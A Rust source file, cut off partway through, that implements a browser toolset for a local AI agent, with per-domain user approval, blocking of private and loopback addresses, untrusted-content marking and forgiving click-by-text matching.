//! The Browser toolset (`BRW`): drives the user's already-installed Chrome or
//! Edge over the Chrome DevTools Protocol. No bundled browser, no Node
//! sidecar — we launch what's already on the machine, in a dedicated profile
//! directory under app-data so the user's real cookies and sessions are
//! never touched. If nothing Chromium-family is found, the toolset says so
//! and stays unavailable rather than downloading one.
//!
//! Text-first, not pixel-first (`BRW-2`): the model this runs on is a small
//! local model with no way to locate pixels, so the tool surface reads pages
//! as visible text and clicks by that same visible text. `browser_screenshot`
//! exists only for the human watching the Browser panel (`BRW-UI-1`) — the
//! agent never needs to see a page to use one.
//!
//! One `BrowserSession` lives per conversation, held in `BrowserPool` (Tauri
//! state) and closed on an idle timeout by `spawn_idle_sweep`, mirroring the
//! engine watchdog's own poll-and-act shape (`runtime/watchdog.rs`).

use std::collections::{HashMap, HashSet};
use std::path::{Path, PathBuf};
use std::time::{Duration, Instant};

use chromiumoxide::browser::{Browser, BrowserConfig};
use chromiumoxide::cdp::browser_protocol::page::CaptureScreenshotFormat;
use chromiumoxide::page::{Page, ScreenshotParams};
use futures_util::StreamExt;
use tokio::sync::Mutex as AsyncMutex;

use crate::permissions::{Decision, PermissionRequest};

use super::toolsets::{mark_untrusted, set_step_note, ToolContext};

/// A session unused this long is closed — a browsing agent forgotten mid-run
/// shouldn't hold a live Chrome process (and a visible window) forever.
const IDLE_TIMEOUT: Duration = Duration::from_secs(10 * 60);
/// Cap on `browser_read`'s full-page text.
const READ_CAP: usize = 8000;
/// Cap on `browse`'s immediate reply — enough to orient, not the whole page.
const BROWSE_CAP: usize = 3000;
/// Action-trail lines kept per session, for the Browser panel (`BRW-UI-1`).
const TRAIL_CAP: usize = 12;

pub fn tool_specs() -> serde_json::Value {
    serde_json::json!([
        {
            "type": "function",
            "function": {
                "name": "browse",
                "description": "Open a page in a real browser and read its visible text. First visit to a new site asks the user to allow it.",
                "parameters": {
                    "type": "object",
                    "properties": { "url": { "type": "string" } },
                    "required": ["url"]
                }
            }
        },
        {
            "type": "function",
            "function": {
                "name": "browser_click",
                "description": "Click a link or button on the open page, by its exact visible text (preferred) or a CSS selector.",
                "parameters": {
                    "type": "object",
                    "properties": {
                        "text": { "type": "string", "description": "Exact visible text of the link or button." },
                        "selector": { "type": "string", "description": "CSS selector, if the text isn't unique or clickable." }
                    },
                    "required": []
                }
            }
        },
        {
            "type": "function",
            "function": {
                "name": "browser_type",
                "description": "Type text into a field on the open page.",
                "parameters": {
                    "type": "object",
                    "properties": {
                        "text": { "type": "string" },
                        "into": { "type": "string", "description": "The field's label, placeholder, name, or a CSS selector." }
                    },
                    "required": ["text"]
                }
            }
        },
        {
            "type": "function",
            "function": {
                "name": "browser_press",
                "description": "Press a single key on the open page (e.g. \"Enter\", \"Escape\", \"Tab\").",
                "parameters": {
                    "type": "object",
                    "properties": { "key": { "type": "string" } },
                    "required": ["key"]
                }
            }
        },
        {
            "type": "function",
            "function": {
                "name": "browser_scroll",
                "description": "Scroll the open page.",
                "parameters": {
                    "type": "object",
                    "properties": {
                        "direction": { "type": "string", "enum": ["down", "up"], "description": "Defaults to down." }
                    },
                    "required": []
                }
            }
        },
        {
            "type": "function",
            "function": {
                "name": "browser_read",
                "description": "Read the open page's full visible text again (e.g. after scrolling).",
                "parameters": { "type": "object", "properties": {}, "required": [] }
            }
        },
        {
            "type": "function",
            "function": {
                "name": "browser_screenshot",
                "description": "Save a picture of the open page, for the person watching — you can't see it yourself.",
                "parameters": {
                    "type": "object",
                    "properties": { "full_page": { "type": "boolean" } },
                    "required": []
                }
            }
        }
    ])
}

pub fn handles(name: &str) -> bool {
    matches!(
        name,
        "browse" | "browser_click" | "browser_type" | "browser_press" | "browser_scroll"
            | "browser_read" | "browser_screenshot"
    )
}

pub fn describe(name: &str, args: &serde_json::Value) -> (String, String) {
    match name {
        "browse" => {
            let url = args.get("url").and_then(|v| v.as_str()).unwrap_or("a page");
            ("visited".into(), url.to_string())
        }
        "browser_click" => {
            let t = args
                .get("text")
                .and_then(|v| v.as_str())
                .or_else(|| args.get("selector").and_then(|v| v.as_str()))
                .unwrap_or("something");
            ("clicked".into(), format!("\u{201c}{t}\u{201d}"))
        }
        "browser_type" => {
            let into = args.get("into").and_then(|v| v.as_str()).unwrap_or("the page");
            ("typed into".into(), into.to_string())
        }
        "browser_press" => {
            let key = args.get("key").and_then(|v| v.as_str()).unwrap_or("a key");
            ("pressed".into(), key.to_string())
        }
        "browser_scroll" => ("scrolled".into(), String::new()),
        "browser_read" => ("read".into(), "the open page".into()),
        "browser_screenshot" => ("photographed".into(), "the open page".into()),
        other => (other.into(), String::new()),
    }
}

pub async fn execute(
    ctx: &ToolContext<'_>,
    name: &str,
    args: &serde_json::Value,
) -> Result<String, String> {
    if ctx.headless {
        return Err(
            "Browsing needs someone to approve the first visit to a site — an unattended \
             run can't ask, so it stopped instead of guessing."
                .to_string(),
        );
    }
    let pool: &BrowserPool = ctx
        .browser_pool
        .ok_or_else(|| "the browser isn't available right now".to_string())?;
    match name {
        "browse" => browse(ctx, pool, args).await,
        "browser_click" => click(ctx, pool, args).await,
        "browser_type" => type_into(ctx, pool, args).await,
        "browser_press" => press(ctx, pool, args).await,
        "browser_scroll" => scroll(ctx, pool, args).await,
        "browser_read" => read(ctx, pool).await,
        "browser_screenshot" => screenshot(ctx, pool, args).await,
        other => Err(format!("Browser doesn't handle '{other}'.")),
    }
}

// ---- domain refusal ----

/// Hosts a browsing agent must never reach, whatever the user answers —
/// `about:`/`file:` step outside the web entirely, and loopback/private
/// ranges are where SSRF against the user's own machine or LAN lives.
fn refused_host(url: &str) -> Option<&'static str> {
    let parsed = url::Url::parse(url).ok()?;
    match parsed.scheme() {
        "http" | "https" => {}
        "about" | "file" | "chrome" | "data" | "javascript" => {
            return Some("that's not a web address I can visit")
        }
        _ => return Some("I can only visit http/https addresses"),
    }
    // `Url::host_str` renders an IPv6 literal bracketed (`[::1]`, matching how
    // it appears in the URL's authority) — strip that before parsing as an
    // `IpAddr` below, or every IPv6 host silently skips the private-range check.
    let host = parsed.host_str()?.trim_start_matches('[').trim_end_matches(']').to_ascii_lowercase();
    if host == "localhost" || host.ends_with(".localhost") || host == "0.0.0.0" {
        return Some("that points at this machine, not the web");
    }
    if let Ok(ip) = host.parse::<std::net::IpAddr>() {
        // An IPv4-mapped IPv6 literal (`::ffff:127.0.0.1`) reaches exactly
        // where the IPv4 address it wraps does — unwrap it before judging, or
        // it walks straight past the v4 rules below.
        let ip = match ip {
            std::net::IpAddr::V6(v6) => v6
                .to_ipv4_mapped()
                .map(std::net::IpAddr::V4)
                .unwrap_or(std::net::IpAddr::V6(v6)),
            v4 => v4,
        };
        let private = match ip {
            std::net::IpAddr::V4(v4) => {
                v4.is_loopback() || v4.is_private() || v4.is_link_local() || v4.is_unspecified()
            }
            std::net::IpAddr::V6(v6) => {
                v6.is_loopback()
                    || v6.is_unspecified()
                    // fc00::/7 unique-local, fe80::/10 link-local.
                    || (v6.segments()[0] & 0xfe00) == 0xfc00
                    || (v6.segments()[0] & 0xffc0) == 0xfe80
            }
        };
        if private {
            return Some("that's a private address, not the web");
        }
    }
    None
}

/// The registrable-ish domain used for the approval gate and the Browser
/// panel — the host as the user would recognise it. Not a true public-suffix
/// computation (`example.co.uk` vs `co.uk`); a per-host prompt is strictly
/// more cautious than under-asking, so the simplification errs safe.
fn host_of(url: &str) -> Option<String> {
    url::Url::parse(url).ok()?.host_str().map(|h| h.to_ascii_lowercase())
}

// ---- session pool ----

struct BrowserSession {
    /// Held only so `Browser`'s `Drop` (`kill_on_drop`) kills the Chrome
    /// process when the session ends — never called on directly.
    _browser: Browser,
    page: Page,
    _handler: tokio::task::JoinHandle<()>,
    last_used: Instant,
    /// Domains approved for this conversation's session so far — cleared
    /// with the session, unlike a persisted "always allow" grant.
    approved: HashSet<String>,
    pub title: String,
    pub domain: String,
    pub screenshot: Option<PathBuf>,
    /// The last *automatic* screenshot, if the current one was taken by the
    /// panel rather than asked for. These are deleted when superseded — a path
    /// handed to the model by `browser_screenshot` stays put.
    ///
    /// The final one outlives the session on purpose: it's the image the
    /// persisted record points at (`BRW-UI-1`), so dropping it here would
    /// leave every re-opened panel with a broken thumbnail. That leaves one
    /// file per browsed conversation, aged out by `prune_screenshots`.
    auto_shot: Option<PathBuf>,
    pub trail: Vec<String>,
}

impl BrowserSession {
    fn note(&mut self, line: String) {
        self.trail.push(line);
        if self.trail.len() > TRAIL_CAP {
            self.trail.remove(0);
        }
    }

    fn panel_state(&self) -> BrowserPanelState {
        BrowserPanelState {
            title: self.title.clone(),
            domain: self.domain.clone(),
            screenshot: self.screenshot.as_ref().map(|p| p.to_string_lossy().to_string()),
            trail: self.trail.clone(),
            closed: false,
        }
    }
}

/// Show the panel where browsing got to, **and** write it down.
///
/// Both, always, at every update — the record has to survive the live session,
/// and a session can end by idle sweep, by Chrome dying, or by the app being
/// closed. None of those run a tidy shutdown path, so persisting on the way
/// past is the only way the record is reliably there. Before this, re-opening
/// a chat showed the visits in the transcript but an empty Browser panel,
/// which reads as the app having lost something.
fn publish(ctx: &ToolContext<'_>, session: &BrowserSession) {
    let state = session.panel_state();
    ctx.db.save_browser_session(
        ctx.conversation_id,
        &state.domain,
        &state.title,
        state.screenshot.as_deref(),
        &state.trail,
    );
    ctx.sink.browser(state);
}


/// One live browsing session per conversation. Tauri-managed state.
#[derive(Default)]
pub struct BrowserPool {
    sessions: AsyncMutex<HashMap<String, BrowserSession>>,
}

/// A snapshot for the Workbench Browser panel (`BRW-UI-1`).
#[derive(Debug, Clone, serde::Serialize)]
pub struct BrowserPanelState {
    pub title: String,
    pub domain: String,
    pub screenshot: Option<String>,
    pub trail: Vec<String>,
    /// The session has ended — the panel says "I closed the page." and keeps
    /// the trail, rather than vanishing as if nothing had happened.
    pub closed: bool,
}

impl BrowserPool {
    pub fn new() -> Self {
        Self::default()
    }

    pub async fn snapshot(&self, conversation_id: &str) -> Option<BrowserPanelState> {
        let sessions = self.sessions.lock().await;
        sessions.get(conversation_id).map(BrowserSession::panel_state)
    }

    /// `BRW-UI-1`'s "Stop browsing" — drops the session, which closes the
    /// devtools connection; `Browser`'s `Drop` kills the child process
    /// (`kill_on_drop`), so no explicit `.close()` await is required here.
    pub async fn stop(&self, conversation_id: &str) -> bool {
        self.sessions.lock().await.remove(conversation_id).is_some()
    }

    /// Close every session idle past `IDLE_TIMEOUT`, returning whose. Called
    /// on a minute tick from `spawn_idle_sweep`.
    async fn sweep(&self) -> Vec<String> {
        let mut sessions = self.sessions.lock().await;
        let stale: Vec<String> = sessions
            .iter()
            .filter(|(_, s)| s.last_used.elapsed() >= IDLE_TIMEOUT)
            .map(|(id, _)| id.clone())
            .collect();
        for id in &stale {
            sessions.remove(id);
        }
        stale
    }

    /// Whether this conversation has already approved `host` for its session.
    async fn is_approved(&self, conversation_id: &str, host: &str) -> bool {
        self.sessions
            .lock()
            .await
            .get(conversation_id)
            .is_some_and(|s| s.approved.contains(host))
    }

    async fn approve(&self, conversation_id: &str, host: &str) {
        if let Some(s) = self.sessions.lock().await.get_mut(conversation_id) {
            s.approved.insert(host.to_string());
        }
    }

    /// The open page's current URL, or empty if the session has gone.
    async fn current_url(&self, conversation_id: &str) -> String {
        let sessions = self.sessions.lock().await;
        match sessions.get(conversation_id) {
            Some(s) => s.page.url().await.ok().flatten().unwrap_or_default(),
            None => String::new(),
        }
    }

    /// Put the page back where it was, after a navigation we wouldn't allow.
    async fn revert_to(&self, conversation_id: &str, url: &str) {
        let sessions = self.sessions.lock().await;
        if let Some(s) = sessions.get(conversation_id) {
            let _ = s.page.goto(url).await;
        }
    }

    async fn ensure(&self, conversation_id: &str, profile_root: &Path) -> Result<(), String> {
        {
            let sessions = self.sessions.lock().await;
            if sessions.contains_key(conversation_id) {
                return Ok(());
            }
        }
        let session = launch(conversation_id, profile_root).await?;
        self.sessions.lock().await.insert(conversation_id.to_string(), session);
        Ok(())
    }
}

/// Periodic idle sweep, spawned once at startup — same shape as
/// `runtime::embedserver::spawn_idle_stop`.
pub fn spawn_idle_sweep(app: tauri::AppHandle) {
    use tauri::Manager;
    tauri::async_runtime::spawn(async move {
        loop {
            tokio::time::sleep(Duration::from_secs(60)).await;
            let Some(pool) = app.try_state::<BrowserPool>() else { return };
            // A session closed behind the user's back still has to say so —
            // otherwise the Browser panel keeps claiming to be looking at a
            // page whose Chrome process is long gone.
            for conversation_id in pool.sweep().await {
                let _ = tauri::Emitter::emit(
                    &app,
                    "poiesis-browser-closed",
                    serde_json::json!({ "conversationId": conversation_id }),
                );
            }
        }
    });
}

/// A Chrome profile is tens of megabytes and one is kept per conversation, so
/// that a chat can stay logged in to a site across sessions. Chats nobody has
/// browsed from in a fortnight don't need theirs any more. Called once at
/// startup, alongside `trash::prune`.
pub fn prune_profiles(data_dir: &Path) {
    const MAX_AGE: Duration = Duration::from_secs(14 * 24 * 60 * 60);
    let Ok(entries) = std::fs::read_dir(data_dir.join("browser-profiles")) else { return };
    for entry in entries.flatten() {
        let stale = entry
            .metadata()
            .and_then(|m| m.modified())
            .map(|m| m.elapsed().map(|age| age > MAX_AGE).unwrap_or(false))
            .unwrap_or(false);
        if stale {
            let _ = std::fs::remove_dir_all(entry.path());
        }
    }
}

/// The panel keeps one screenshot per browsed conversation so a re-opened
/// chat still shows the page. They're small, but they are unbounded over
/// enough conversations, so they age out on the same fortnight as the profiles
/// they belong to. A record whose image has been swept still shows the domain,
/// title and trail — `browser_state_cmd` drops the path when the file is gone.
pub fn prune_screenshots(data_dir: &Path) {
    const MAX_AGE: Duration = Duration::from_secs(14 * 24 * 60 * 60);
    let Ok(entries) = std::fs::read_dir(data_dir.join("browser-screenshots")) else { return };
    for entry in entries.flatten() {
        let stale = entry
            .metadata()
            .and_then(|m| m.modified())
            .map(|m| m.elapsed().map(|age| age > MAX_AGE).unwrap_or(false))
            .unwrap_or(false);
        if stale {
            let _ = std::fs::remove_file(entry.path());
        }
    }
}

async fn launch(conversation_id: &str, profile_root: &Path) -> Result<BrowserSession, String> {
    let exe = chromiumoxide::detection::default_executable(Default::default()).map_err(|_| {
        "I don't see Chrome or Edge installed — the browser needs one of those already on \
         this machine."
            .to_string()
    })?;
    let profile_dir = profile_root.join("browser-profiles").join(conversation_id);
    std::fs::create_dir_all(&profile_dir).map_err(|e| e.to_string())?;

    // Headless, deliberately: a Chrome window opening on top of what the user
    // is doing and stealing focus mid-conversation is worse than watching the
    // Browser panel, which is where `BRW-UI-1` puts the page anyway. The *new*
    // headless mode, not the legacy one — legacy is a different binary path
    // that current Chrome has dropped, and it's fingerprinted far more
    // aggressively by the sites we'd want to read. The window size is set
    // because the default 800x600 makes the panel's screenshots useless.
    let config = BrowserConfig::builder()
        .chrome_executable(exe)
        .user_data_dir(profile_dir)
        .new_headless_mode()
        .window_size(1280, 900)
        .build()?;
    let (browser, mut handler) = Browser::launch(config).await.map_err(|e| e.to_string())?;
    let handler_task = tokio::task::spawn(async move {
        while handler.next().await.is_some() {}
    });
    let page = browser
        .new_page("about:blank")
        .await
        .map_err(|e| e.to_string())?;

    Ok(BrowserSession {
        _browser: browser,
        page,
        _handler: handler_task,
        last_used: Instant::now(),
        approved: HashSet::new(),
        title: String::new(),
        domain: String::new(),
        screenshot: None,
        auto_shot: None,
        trail: Vec::new(),
    })
}

// ---- domain approval (BRW-3) ----

/// Blocks until the user answers, exactly like `filesystem.rs`'s folder-scope
/// gate — reusing the same `PermissionManager` oneshot and the same
/// `Decision`, just a different `PermissionRequest` shape (`capability`).
///
/// Takes the pool rather than a borrowed session on purpose: the session lock
/// must **not** be held while the prompt sits there. A person can take a
/// minute to answer, and the same lock is what "Stop browsing", the panel and
/// every other conversation's browsing goes through.
async fn gate_domain(ctx: &ToolContext<'_>, pool: &BrowserPool, host: &str) -> Result<(), String> {
    if pool.is_approved(ctx.conversation_id, host).await {
        return Ok(());
    }
    if ctx.db.has_capability_grant("domain", host).unwrap_or(false) {
        pool.approve(ctx.conversation_id, host).await;
        return Ok(());
    }
    let id = format!("perm_{}", uuid::Uuid::new_v4());
    let rx = ctx.perms.open_request(&id);
    ctx.sink.send_permission(PermissionRequest::capability(
        id,
        "domain",
        format!("I'd like to visit {host}"),
        host.to_string(),
    ));
    match rx.await.unwrap_or(Decision::Deny) {
        Decision::Deny => Err(format!("You declined letting me visit {host}.")),
        Decision::Once | Decision::Chat => {
            pool.approve(ctx.conversation_id, host).await;
            Ok(())
        }
        Decision::Forever => {
            let _ = ctx.db.add_capability_grant("domain", host);
            pool.approve(ctx.conversation_id, host).await;
            Ok(())
        }
    }
}

/// `BRW-3`'s "a page that navigates itself somewhere new re-triggers the
/// gate". Run after any action that could have moved the page — a click, a
/// keypress that submits a form, a redirect that landed while we waited.
/// Returns whether the page actually moved, so the caller knows whether the
/// panel is worth a fresh screenshot.
async fn enforce_domain_after(
    ctx: &ToolContext<'_>,
    pool: &BrowserPool,
    before_url: &str,
) -> Result<bool, String> {
    let after_url = pool.current_url(ctx.conversation_id).await;
    if after_url == before_url {
        return Ok(false);
    }
    let Some(after_host) = host_of(&after_url) else { return Ok(true) };
    if host_of(before_url).as_deref() == Some(after_host.as_str()) {
        return Ok(true);
    }
    if let Some(reason) = refused_host(&after_url) {
        pool.revert_to(ctx.conversation_id, before_url).await;
        return Err(format!(
            "That tried to take us to {after_host}, and {reason} — I stayed put."
        ));
    }
    if gate_domain(ctx, pool, &after_host).await.is_err() {
        pool.revert_to(ctx.conversation_id, before_url).await;
        return Err(format!(
            "That tried to leave for {after_host}. Navigation was blocked — say the word if you want me to go there."
        ));
    }
    Ok(true)
}

/// The tail every page-changing action shares: refresh the panel, note what
/// happened, and hand the model the page it's now looking at.
async fn finish_action(
    ctx: &ToolContext<'_>,
    pool: &BrowserPool,
    note: String,
    shoot: bool,
) -> Result<String, String> {
    let mut sessions = pool.sessions.lock().await;
    let session = sessions
        .get_mut(ctx.conversation_id)
        .ok_or("the browser session closed while I was working")?;
    settle(session).await;
    session.note(note);
    if shoot {
        capture_auto(session, ctx.data_dir).await;
    }
    publish(ctx, session);
    let host = session.domain.clone();
    let out = visible_text(&session.page).await?;
    Ok(mark_untrusted(ctx, &format!("page at {host}"), &clamp(&out, BROWSE_CAP)))
}

// ---- tool bodies ----

async fn browse(ctx: &ToolContext<'_>, pool: &BrowserPool, args: &serde_json::Value) -> Result<String, String> {
    let url = args
        .get("url")
        .and_then(|v| v.as_str())
        .map(str::trim)
        .filter(|v| !v.is_empty())
        .ok_or("missing 'url' argument")?;
    if let Some(reason) = refused_host(url) {
        return Err(reason.to_string());
    }
    let host = host_of(url).ok_or("that doesn't look like a web address")?;

    pool.ensure(ctx.conversation_id, ctx.data_dir).await?;
    gate_domain(ctx, pool, &host).await?;

    {
        let mut sessions = pool.sessions.lock().await;
        let session = sessions.get_mut(ctx.conversation_id).ok_or("browser session lost")?;
        session.last_used = Instant::now();
        session.page.goto(url).await.map_err(|e| e.to_string())?;
        let _ = session.page.wait_for_navigation().await;
    }
    // A redirect can land somewhere else entirely between `goto` and settle.
    let before = url.to_string();
    enforce_domain_after(ctx, pool, &before).await?;

    set_step_note(ctx, format!("visited {host}"));
    let body = finish_action(ctx, pool, format!("visited {host}"), true).await?;
    let (title, domain) = {
        let sessions = pool.sessions.lock().await;
        match sessions.get(ctx.conversation_id) {
            Some(s) => (s.title.clone(), s.domain.clone()),
            None => (String::new(), host.clone()),
        }
    };
    Ok(format!("{title} — {domain}\n\n{body}"))
}

async fn click(ctx: &ToolContext<'_>, pool: &BrowserPool, args: &serde_json::Value) -> Result<String, String> {
    let text = args.get("text").and_then(|v| v.as_str()).map(str::trim).filter(|v| !v.is_empty());
    let selector = args.get("selector").and_then(|v| v.as_str()).map(str::trim).filter(|v| !v.is_empty());
    if text.is_none() && selector.is_none() {
        return Err("give me either 'text' (what the link/button says) or a 'selector'".to_string());
    }

    let (before_url, clicked_label) = {
        let mut sessions = pool.sessions.lock().await;
        let session = sessions.get_mut(ctx.conversation_id).ok_or("open a page first with browse")?;
        session.last_used = Instant::now();
        let before_url = session.page.url().await.ok().flatten().unwrap_or_default();

        // What was really clicked, which is rarely character-for-character
        // what the model asked for — the trail should say the former.
        let label = if let Some(sel) = selector {
            let el = session
                .page
                .find_element(sel)
                .await
                .map_err(|e| format!("couldn't find {sel}: {e}"))?;
            el.click().await.map_err(|e| e.to_string())?;
            sel.to_string()
        } else if let Some(t) = text {
            click_by_text(&session.page, t).await?
        } else {
            String::new()
        };
        let _ = session.page.wait_for_navigation().await;
        (before_url, label)
    };

    // The click may have navigated to a new domain (a redirect, or an
    // unlabelled `target="_blank"` link) — the domain was the decision
    // (`BRW-3`), so a changed host re-triggers the gate rather than silently
    // landing somewhere new.
    let moved = enforce_domain_after(ctx, pool, &before_url).await?;

    set_step_note(ctx, format!("clicked \u{201c}{clicked_label}\u{201d}"));
    finish_action(ctx, pool, format!("clicked \u{201c}{clicked_label}\u{201d}"), moved).await
}

/// Find and click a link or button by what it says.
///
/// Matching is deliberately forgiving, because the text the model passes here
/// came from `innerText` a few steps earlier and will not survive a round trip
/// intact. Three things went wrong with strict XPath matching, all of them in
/// one real transcript trying to click an ORF headline:
///
/// - **`text()` is not the element's text.** It selects only direct child text
///   nodes, so `<a><span>Taifun</span> legt lahm</a>` never matched. The
///   string-value of the whole element is what a reader sees.
/// - **Typography differs.** A page's `„Dolphin“` comes back through the model
///   as `"Dolphin"`; curly quotes, en dashes and collapsed whitespace all have
///   to be normalized away before comparing.
/// - **A miss taught the model nothing.** "I don't see anything that says X"
///   invites the same guess again with different quotes, which is exactly what
///   happened, twice. Naming what *is* clickable turns a dead end into a
///   retry that can work.
///
/// Returns the text actually clicked, which is what the trail should say —
/// not the model's approximation of it.
const CLICK_BY_TEXT_JS: &str = r#"
(() => {
  const needle = __NEEDLE__;
  // Fold away everything that differs between what a page renders and what
  // comes back through a model: smart quotes, dashes, runs of whitespace.
  const norm = (s) => (s || "")
    .replace(/[‘’‚‛′]/g, "'")
    .replace(/[“”„‟″]/g, '"')
    .replace(/[‐-―]/g, "-")
    .replace(/ /g, " ")
    .replace(/\s+/g, " ")
    .trim()
    .toLowerCase();

  const want = norm(needle);
  const sel = "a,button,[role=button],[role=link],input[type=submit],input[type=button],summary,[onclick]";
  const visible = Array.from(document.querySelectorAll(sel)).filter((el) => {
    const r = el.getBoundingClientRect();
    if (r.width <= 0 || r.height <= 0) return false;
    const st = getComputedStyle(el);
    return st.visibility !== "hidden" && st.display !== "none";
  });

  const shown = (el) =>
    (el.innerText || el.textContent || el.value || el.getAttribute("aria-label") || "")
      .replace(/\s+/g, " ")
      .trim();
  const label = (el) => norm(shown(el));

  let hit = visible.find((el) => label(el) === want);
  if (!hit && want.length > 3) {
    // Substring either way: the model often quotes a headline slightly long
    // (picking up a kicker) or slightly short (truncating it). Shortest match
    // wins so an enclosing card doesn't beat the headline inside it.
    hit = visible
      .filter((el) => {
        const l = label(el);
        return l.length > 3 && (l.includes(want) || want.includes(l));
      })
      .sort((a, b) => label(a).length - label(b).length)[0];
  }

  if (hit) {
    hit.scrollIntoView({ block: "center" });
    const what = shown(hit).slice(0, 120);
    hit.click();
    return JSON.stringify({ clicked: what });
  }

  const options = Array.from(new Set(visible.map(shown)))
    .filter((t) => t.length > 0 && t.length < 90)
    .slice(0, 20);
  return JSON.stringify({ candidates: options });
})()
"#;

/// A safe XPath string literal, handling text that itself contains quotes via
/// `concat()` — XPath 1.0 has no escape character. Still used by the field
/// finder in `type_into`, which matches attributes (`placeholder`, `name`)
/// rather than rendered text and so doesn't need the forgiving matcher above.
fn xpath_literal(s: &str) -> String {
    if !s.contains('\'') {
        return format!("'{s}'");
    }
    if !s.contains('"') {
        return format!("\"{s}\"");
    }
    let parts: Vec<String> = s.split('\'').map(|p| format!("'{p}'")).collect();
    format!("concat({})", parts.join(", \"'\", "))
}

async fn click_by_text(page: &Page, text: &str) -> Result<String, String> {
    // JSON string literals are valid JS string literals, so this is how the
    // model's text crosses into the page without being able to end the string
    // and run something of its own.
    let needle = serde_json::to_string(text).map_err(|e| e.to_string())?;
    let raw: String = page
        .evaluate(CLICK_BY_TEXT_JS.replace("__NEEDLE__", &needle))
        .await
        .map_err(|e| e.to_string())?
        .into_value()
        .map_err(|e| e.to_string())?;

    let parsed: serde_json::Value = serde_json::from_str(&raw).map_err(|e| e.to_string())?;
    if let Some(clicked) = parsed.get("clicked").and_then(|v| v.as_str()) {
        return Ok(clicked.to_string());
    }

    let candidates: Vec<&str> =
        parsed.get("candidates").and_then(|v| v.as_array()).map(|a| {
            a.iter().filter_map(|v| v.as_str()).collect()
        }).unwrap_or_default();

    if candidates.is_empty() {
        return Err(format!(
            "I don't see anything clickable on this page that says \u{201c}{text}\u{201d}, and I \
             can't see any links or buttons at all — the page may still be loading."
        ));
    }
    Err(format!(
        "I don't see anything that says \u{201c}{text}\u{201d}. What I can click here: {}. \
         Use one of those exactly, or pass a CSS selector instead.",
        candidates
            .iter()
            .map(|c| format!("\u{201c}{c}\u{201d}"))
            .collect::<Vec<_>>()
            .join(", ")
    ))
}

async fn type_into(ctx: &ToolContext<'_>, pool: &BrowserPool, args: &serde_json::Value) -> Result<String, String> {
    let text = args.get("text").and_then(|v| v.as_str()).ok_or("missing 'text' argument")?;
    let into = args.get("into").and_then(|v| v.as_str()).map(str::trim).filter(|v| !v.is_empty());

    let mut sessions = pool.sessions.lock().await;
    let session = sessions.get_mut(ctx.conversation_id).ok_or("open a page first with browse")?;
    session.last_used = Instant::now();

    let el = match into {
        Some(target) => match session.page.find_element(target).await {
            Ok(el) => el,
            Err(_) => {
                let q = xpath_literal(target);
                let expr = format!(
                    "//input[@placeholder={q} or @aria-label={q} or @name={q} or @id={q}] | \
                     //textarea[@placeholder={q} or @aria-label={q} or @name={q} or @id={q}]"
                );
                session
                    .page
                    .find_xpath(expr)
                    .await
                    .map_err(|_| format!("I don't see a field matching \u{201c}{target}\u{201d}"))?
            }
        },
        None => session
            .page
            .find_element("input, textarea")
            .await
            .map_err(|_| "I don't see a field on this page".to_string())?,
    };
    el.focus().await.map_err(|e| e.to_string())?;
    el.type_str(text).await.map_err(|e| e.to_string())?;
    session.note(format!("typed into {}", into.unwrap_or("the page")));
    publish(ctx, session);
    Ok(format!("Typed into {}.", into.unwrap_or("the field")))
}

async fn press(ctx: &ToolContext<'_>, pool: &BrowserPool, args: &serde_json::Value) -> Result<String, String> {
    let key = args.get("key").and_then(|v| v.as_str()).ok_or("missing 'key' argument")?;
    let before_url = {
        let mut sessions = pool.sessions.lock().await;
        let session = sessions.get_mut(ctx.conversation_id).ok_or("open a page first with browse")?;
        session.last_used = Instant::now();
        let before_url = session.page.url().await.ok().flatten().unwrap_or_default();
        let el = session.page.find_element("body").await.map_err(|e| e.to_string())?;
        el.press_key(key).await.map_err(|e| e.to_string())?;
        let _ = session.page.wait_for_navigation().await;
        before_url
    };
    // Enter in a search box is a form submit, and a form can post to another
    // host — the same `BRW-3` gate a click gets.
    let moved = enforce_domain_after(ctx, pool, &before_url).await?;
    finish_action(ctx, pool, format!("pressed {key}"), moved).await
}

async fn scroll(ctx: &ToolContext<'_>, pool: &BrowserPool, args: &serde_json::Value) -> Result<String, String> {
    let down = args.get("direction").and_then(|v| v.as_str()).map(|d| d != "up").unwrap_or(true);
    {
        let mut sessions = pool.sessions.lock().await;
        let session = sessions.get_mut(ctx.conversation_id).ok_or("open a page first with browse")?;
        session.last_used = Instant::now();
        let delta = if down { "window.innerHeight * 0.85" } else { "-window.innerHeight * 0.85" };
        let _ = session.page.evaluate(format!("window.scrollBy(0, {delta})")).await;
    }
    let note = if down { "scrolled down" } else { "scrolled up" };
    finish_action(ctx, pool, note.to_string(), false).await
}

async fn read(ctx: &ToolContext<'_>, pool: &BrowserPool) -> Result<String, String> {
    let mut sessions = pool.sessions.lock().await;
    let session = sessions.get_mut(ctx.conversation_id).ok_or("open a page first with browse")?;
    session.last_used = Instant::now();
    let host = session.domain.clone();
    let out = visible_text(&session.page).await?;
    Ok(mark_untrusted(ctx, &format!("page at {host}"), &clamp(&out, READ_CAP)))
}

async fn screenshot(ctx: &ToolContext<'_>, pool: &BrowserPool, args: &serde_json::Value) -> Result<String, String> {
    let full_page = args.get("full_page").and_then(|v| v.as_bool()).unwrap_or(false);
    let mut sessions = pool.sessions.lock().await;
    let session = sessions.get_mut(ctx.conversation_id).ok_or("open a page first with browse")?;
    session.last_used = Instant::now();

    let path = shoot(session, ctx.data_dir, full_page).await?;
    // Asked for by name, so the path is the answer — it outlives the session
    // rather than being cleaned up as the panel's own scratch.
    if let Some(stale) = session.auto_shot.take() {
        let _ = std::fs::remove_file(stale);
    }
    session.screenshot = Some(path.clone());
    session.note("took a screenshot".to_string());
    publish(ctx, session);
    Ok(format!("Saved a screenshot to {}.", path.display()))
}

/// `BRW-UI-1`: the panel takes its own picture after a navigation, which is
/// what makes it feel alive rather than a list of past-tense sentences.
/// Best-effort — a page that won't screenshot shouldn't fail the action.
async fn capture_auto(session: &mut BrowserSession, data_dir: &Path) {
    let Ok(path) = shoot(session, data_dir, false).await else { return };
    if let Some(stale) = session.auto_shot.replace(path.clone()) {
        let _ = std::fs::remove_file(stale);
    }
    session.screenshot = Some(path);
}

async fn shoot(
    session: &BrowserSession,
    data_dir: &Path,
    full_page: bool,
) -> Result<PathBuf, String> {
    let dir = data_dir.join("browser-screenshots");
    std::fs::create_dir_all(&dir).map_err(|e| e.to_string())?;
    let path = dir.join(format!("{}.png", uuid::Uuid::new_v4()));
    let params = ScreenshotParams::builder()
        .format(CaptureScreenshotFormat::Png)
        .full_page(full_page)
        .build();
    session
        .page
        .save_screenshot(params, &path)
        .await
        .map_err(|e| e.to_string())?;
